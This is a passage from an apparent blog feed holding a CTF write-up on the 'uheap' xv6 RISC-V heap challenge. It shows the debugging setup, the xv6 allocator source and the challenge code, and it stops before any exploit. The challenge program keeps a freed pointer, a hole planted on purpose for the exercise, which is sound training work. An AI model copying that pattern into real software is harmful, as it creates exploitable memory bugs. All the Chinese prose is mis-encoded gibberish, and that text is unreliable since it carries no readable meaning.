†åˆ©ç”¨æ‰‹æ³•éƒ½è¿‡æ—¶äº†ï¼Œä¸è¿‡æ„Ÿè§‰ä¾ç„¶å¯ä»¥ä½œä¸ºä¸€æœ¬å¾ˆå¥½å¾ˆç³»ç»Ÿçš„<code>pwn</code>å…¥é—¨ä¹¦ç±ï¼ŒæœŸæœ«åçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°æƒ³å­¦<code>pwn</code>çš„å­¦å¼Ÿï¼ŒæŠŠè¿™æœ¬ä¹¦é€ä»–å¹¶å¤©å¤©ç£ä¿ƒä»–å­¦<code>pwn</code>(å·²ç»æœ‰ä¸€ä½å­¦<code>web</code>çš„å­¦å¼Ÿæˆä¸ºå—å®³è€…äº†)ï¼Œå¥½ä¹¦ä¸èƒ½æµªè´¹(å…¶å®æ˜¯æ€•ä»¥åæ²¡äººå¸¦&gt;_&lt;)</p><h1 id="2024-1-1"><a href="#2024-1-1" class="headerlink" title="2024&#x2F;1&#x2F;1"></a>2024&#x2F;1&#x2F;1</h1><p>2023å¹´è¿‡çš„å¤ªå¤±è´¥äº†ï¼Œ2024ç»™æˆ‘å†²ï¼ï¼ï¼æˆ‘è¦å˜å¼ºï¼ï¼ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€é“risc-væ¶æ„xv6æ“ä½œç³»ç»Ÿçš„å †</title>
      <link href="/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/"/>
      <url>/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<p>é™„ä»¶ï¼š<a href="https://github.com/Qanux/uheap">https://github.com/Qanux/uheap</a><br>è¿™æ˜¯ä¸€é“<code>133nson</code>å¸ˆå…„å‡ºçš„é¢˜(å¤ªå¼ºå•¦),çœ‹äº†ååªèƒ½è¯´è‡ªå·±çš„è§è¯†è¿˜æ˜¯å¤ªå°‘äº†ã€‚<br>è¿™ä¸€é“æ˜¯<code>xv6</code>ç³»ç»Ÿçš„å †é¢˜ï¼Œé™„ä»¶å·²ç»ç»™å‡ºäº†ä¸€ä¸ªå®Œæ•´çš„<code>qemu</code>ç¯å¢ƒï¼Œåªè¦è¾“å…¥<code>./run.sh</code>å³å¯å¯åŠ¨ç¨‹åº<br>é¢˜ç›®æœ‰ä¸€ä¸ª<code>hint</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This challenge is running on the xv6 system. (Attention: its heap allocator is different from GLIBC)</span><br><span class="line">You can get the xv6 source files on https://github.com/mit-pdos/xv6-riscv</span><br><span class="line">You can run this challenge locally using the command &#x27;./run.sh&#x27; and your goal is to PWN the binary chal</span><br><span class="line">To make things simple, the binary file is compiled with debug_info and I have left its source code in chal.c. This means you can use qemu and gdb-multiarch(or other debuggers) for source level debugging if necessary. (You just need to add &#x27;-S -gdb tcp::26000&#x27; to the qemu parameter in the file run.sh then you can start gdb for local debugging)</span><br><span class="line">Here are some useful gdb commands. You can write them in the file .gdbinit and start gdb with the command &#x27;gdb-multiarch -x .gdbinit&#x27;</span><br><span class="line"></span><br><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line"></span><br><span class="line">If you have any problem about the remote environment, please contact the admin. Have fun!</span><br></pre></td></tr></table></figure><p>ç”±äº<code>elf</code>æ–‡ä»¶æ˜¯é™„å¸¦è°ƒè¯•ä¿¡æ¯ç¼–è¯‘çš„ï¼Œè¿™å¤§å¤§æ–¹ä¾¿äº†æˆ‘ä»¬è¿›è¡ŒåŠ¨æ€è°ƒè¯•</p><h3 id="å¦‚ä½•è°ƒè¯•"><a href="#å¦‚ä½•è°ƒè¯•" class="headerlink" title="å¦‚ä½•è°ƒè¯•"></a>å¦‚ä½•è°ƒè¯•</h3><p>ç›¸ä¿¡å¾ˆå¤šèŒæ–°è¿˜ä¸çŸ¥é“æ€ä¹ˆè¿›è¡Œè°ƒè¯•ï¼Œè¿™é‡Œå°±è¿›è¡Œå‚»ç“œå¼æ•™å­¦<br>é¦–å…ˆåœ¨<code>github</code>ä¸Šé¢ä¸‹è½½<code>umalloc.c</code>æ–‡ä»¶(<code>hint</code>æ–‡ä»¶ä¸Šå†™æ˜äº†)ï¼Œç„¶åå°†è¯¥æ–‡ä»¶æ”¾å…¥åœ¨å’Œ<code>chal</code>åŒä¸€ä¸ªè·¯å¾„ä¸‹<br>ç„¶åå°†<code>run.sh</code>æ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œä¿®æ”¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LD_LIBRARY_PATH=./depend exec ./qemu-system-riscv64 \</span><br><span class="line">        -machine virt \</span><br><span class="line">        -bios none \</span><br><span class="line">        -kernel kernel \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -smp 3 \</span><br><span class="line">        -nographic \</span><br><span class="line">        -drive file=fs.img,if=none,format=raw,id=x0 \</span><br><span class="line">        -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -S -gdb tcp::26000</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é€šè¿‡<code>./run.sh</code>æ¥å¯åŠ¨ï¼Œç„¶åå†é‡æ–°æ‰“å¼€å¦å¤–ä¸€ä¸ªç»ˆç«¯ï¼Œè¿›å…¥åˆ°<code>chal</code>æ–‡ä»¶çš„è·¯å¾„ä¸‹ï¼Œé€šè¿‡<code>gdb-multiarch</code>ï¼Œç„¶åä¾æ¬¡è¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line">b main</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å³å¯è¿›è¡Œè°ƒè¯•ï¼Œä¸è¿‡æˆ‘ä»¬ä¸èƒ½å‘å¹³æ—¶ä¸€æ ·é€šè¿‡<code>bin</code>ã€<code>stack</code>è¿™äº›æŒ‡ä»¤æ¥æŸ¥çœ‹å †å†…å­˜(å…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆçœ‹ï¼Œè¯·æ±‚å¤§ä½¬æŒ‡æ•™)ï¼Œä¸è¿‡x<code>/16gx</code> è¿™ä¸€äº›åŸºç¡€çš„æŒ‡ä»¤è¿˜æ˜¯å¯ä»¥ä½¿ç”¨</p><h3 id="xv6å †ç®¡ç†åˆ†æ"><a href="#xv6å †ç®¡ç†åˆ†æ" class="headerlink" title="xv6å †ç®¡ç†åˆ†æ"></a>xv6å †ç®¡ç†åˆ†æ</h3><p>é¦–å…ˆæ¥çœ‹çœ‹<code>xv6</code>ä¸­çš„å †å—é•¿ä»€ä¹ˆæ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">        uint size;</span><br><span class="line">    &#125; s;</span><br><span class="line">    Align x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å †å—çš„ç»“æ„å’Œæˆ‘ä»¬å¹³æ—¶<code>glibc</code>ä¸­çš„ä¸ä¸€æ ·ï¼Œä»–æ²¡æœ‰<code>prev_size</code>ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å †å—çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥çŒœåˆ°è¿™ä¸ªæŒ‡é’ˆå› è¯¥å’Œæˆ‘ä»¬çš„<code>fd</code>æŒ‡é’ˆç±»ä¼¼(å‚¨å­˜åœ¨<code>free</code>åçš„é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ª<code>free</code>çš„å †å—çš„å †å¤´çš„ä½ç½®)<br>umalloc.c(<a href="https://github.com/mit-pdos/xv6-riscv">https://github.com/mit-pdos/xv6-riscv</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory allocator by Kernighan and Ritchie,</span></span><br><span class="line"><span class="comment">// The C programming Language, 2nd ed.  Section 8.7.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    uint size;</span><br><span class="line">  &#125; s;</span><br><span class="line">  Align x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">header</span> <span class="title">Header</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header base;</span><br><span class="line"><span class="type">static</span> Header *freep;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="type">void</span> *ap)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *bp, *p;</span><br><span class="line"></span><br><span class="line">  bp = (Header*)ap - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">    <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span>(bp + bp-&gt;s.size == p-&gt;s.ptr)&#123;</span><br><span class="line">    bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;</span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">  <span class="keyword">if</span>(p + p-&gt;s.size == bp)&#123;</span><br><span class="line">    p-&gt;s.size += bp-&gt;s.size;</span><br><span class="line">    p-&gt;s.ptr = bp-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    p-&gt;s.ptr = bp;</span><br><span class="line">  freep = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header*</span><br><span class="line"><span class="title function_">morecore</span><span class="params">(uint nu)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  Header *hp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(nu &lt; <span class="number">4096</span>)</span><br><span class="line">    nu = <span class="number">4096</span>;</span><br><span class="line">  p = sbrk(nu * <span class="keyword">sizeof</span>(Header));</span><br><span class="line">  <span class="keyword">if</span>(p == (<span class="type">char</span>*)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hp = (Header*)p;</span><br><span class="line">  hp-&gt;s.size = nu;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)(hp + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> freep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(uint nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *p, *prevp;</span><br><span class="line">  uint nunits;</span><br><span class="line"></span><br><span class="line">  nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>((prevp = freep) == <span class="number">0</span>)&#123;</span><br><span class="line">    base.s.ptr = freep = prevp = &amp;base;</span><br><span class="line">    base.s.size = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(p = prevp-&gt;s.ptr; ; prevp = p, p = p-&gt;s.ptr)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;s.size &gt;= nunits)&#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;s.size == nunits)</span><br><span class="line">        prevp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        p-&gt;s.size -= nunits;</span><br><span class="line">        p += p-&gt;s.size;</span><br><span class="line">        p-&gt;s.size = nunits;</span><br><span class="line">      &#125;</span><br><span class="line">      freep = prevp;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)(p + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == freep)</span><br><span class="line">      <span class="keyword">if</span>((p = morecore(nunits)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¾§é‡çœ‹ä¸€ä¸‹å †å—å¤§å°çš„è®¡ç®—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯åŸæœ¬çš„å †å—å¤§å°å‡ä¸€åŠ ä¸Šä¸€ä¸ªå †å¤´ç»“æ„çš„å¤§å°åé™¤ä»¥å †å¤´çš„å¤§å°å†å‘ä¸Šå–æ•´ï¼ˆæ¯”å¦‚ç”³è¯·<code>0x19</code>å¤§å°çš„å †å—è®¡ç®—å‡ºçš„<code>size</code>ä¸º<code>3</code>ï¼Œç”³è¯·<code>0x30</code>çš„å †å—è®¡ç®—å‡ºçš„<code>size</code>ä¸º<code>4</code>ï¼‰</p><h4 id="mallocå‡½æ•°"><a href="#mallocå‡½æ•°" class="headerlink" title="mallocå‡½æ•°"></a>mallocå‡½æ•°</h4><p>åœ¨<code>malloc</code>å‡½æ•°ä¸­ï¼Œå…ˆæ ¹æ®ç”³è¯·çš„å †å—è®¡ç®—å‡ºç›¸åº”çš„å †å—å¤§å°ï¼Œè‹¥<code>free</code>é“¾è¡¨çš„è¡¨å¤´ä¸º<code>0</code>ï¼ˆ<code>free</code>é“¾è¡¨å°šæœªåˆå§‹åŒ–ï¼Œåˆ™ä¼šå°†é™æ€å…¨å±€å˜é‡<code>base</code>çš„åœ°å€èµ‹å€¼ç»™<code>free</code>çš„è¡¨å¤´æŒ‡é’ˆ<code>freep</code>ï¼‰ã€‚ç„¶åä¼šä»<code>prevp-&gt;s.ptr</code>ï¼ˆè¡¨å¤´åçš„ç¬¬ä¸€ä¸ªå †å—æŒ‡é’ˆï¼‰å¼€å§‹é¡ºç€<code>s.ptr</code>éå†<code>free</code>é“¾è¡¨ï¼Œè‹¥é‡åˆ°æ¯”å¾…ç”³è¯·çš„å †å—å¤§å°å¤§çš„å †å—ï¼Œåˆ™ä¼šç›´æ¥åˆ‡åˆ†è¯¥å †å—ï¼Œå°†å‰ä¸€éƒ¨åˆ†è¿”å›ï¼Œåä¸€éƒ¨åˆ†ç•™åœ¨é“¾è¡¨å†…ï¼›è‹¥é‡åˆ°<code>size</code>åˆšå¥½ç¬¦åˆéœ€æ±‚çš„ï¼Œåˆ™å°†å…¶è„±é“¾åç›´æ¥è¿”å›ï¼›è‹¥éå†å®Œæ•´ä¸ªé“¾è¡¨ä»æœªé‡åˆ°å¯ä»¥è¿›è¡Œåˆ†é…çš„<code>free</code>å †å—ï¼Œåˆ™ä¼šè°ƒç”¨<code>morecore</code>å‡½æ•°å‘ç³»ç»Ÿç”³è¯·æ›´å¤šçš„å†…å­˜ã€‚</p><h4 id="freeå‡½æ•°"><a href="#freeå‡½æ•°" class="headerlink" title="freeå‡½æ•°"></a>freeå‡½æ•°</h4><p>åœ¨<code>free</code>å‡½æ•°ä¸­ï¼Œä¼šå…ˆéå†<code>free</code>é“¾è¡¨ï¼Œè‹¥é€”ä¸­é‡åˆ°å¾…é‡Šæ”¾çš„å †å—åœ°å€å¤„äºé“¾è¡¨ä¸­çš„ä¸¤ä¸ª<code>free</code>å †å—ä¹‹é—´çš„è¯ï¼Œåˆ™ä¼šæå‰é€€å‡ºï¼Œå¦åˆ™ç­‰å¾…é“¾è¡¨è¢«éå†å®Œä¸€è½®ä¹‹åé€€å‡ºï¼ˆå®é™…ä¸Šè¯¥é“¾è¡¨ä¸ºä¸€ä¸ªå•å‘å¾ªç¯é“¾è¡¨ï¼‰ã€‚ç„¶åæ£€æŸ¥è¯¥å †å—æ˜¯å¦æœ‰å‰&#x2F;åå‘ç›¸é‚»çš„<code>free</code>å †å—ï¼Œè‹¥æœ‰åˆ™è¿›è¡Œå‰&#x2F;åå‘åˆå¹¶ï¼Œè‹¥æ— åˆ™å°†å…¶ç›´æ¥æ’å…¥åˆ°<code>free</code>é“¾è¡¨ä¸­ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@åœˆåœˆ:/mnt/d/desktop/uheap$ checksec chal</span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] &#x27;/mnt/d/desktop/uheap/chal&#x27;</span><br><span class="line">    Arch:     riscv64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>åªå¼€å¯çš„<code>NX enabled</code>(<code>133nson</code>ï¼šâ€œé€åˆ†é¢˜â€)<br>å‡ºé¢˜äººæ¯”è¾ƒå‹å¥½ï¼Œç›´æ¥ç»™å‡ºäº†é¢˜ç›®æºç <br>chal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *arr[<span class="number">4</span>];</span><br><span class="line"><span class="type">void</span> *record;</span><br><span class="line"><span class="type">int</span> chance = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         __\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  __  __/ /_  ___  ____ _____\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; / / / / __ \\/ _ \\/ __ `/ __ \\\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;/ /_/ / / / /  __/ /_/ / /_/ /\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\__,_/_/ /_/\\___/\\__,_/ .___/\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                     /_/\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. add\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. delete\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. ???\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">read(<span class="number">1</span>, &amp;buf[i], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(buf[i] == <span class="string">&#x27;\x0a&#x27;</span>)&#123;</span><br><span class="line">buf[i] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (size &lt; <span class="number">0</span> || size &gt; <span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">4</span>; idx++)</span><br><span class="line"><span class="keyword">if</span> (arr[idx] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (idx == <span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arr[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">readline(arr[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[idx]) &#123;</span><br><span class="line"><span class="built_in">free</span>(arr[idx]);</span><br><span class="line"><span class="keyword">if</span> (chance)</span><br><span class="line">record = arr[idx];</span><br><span class="line">arr[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 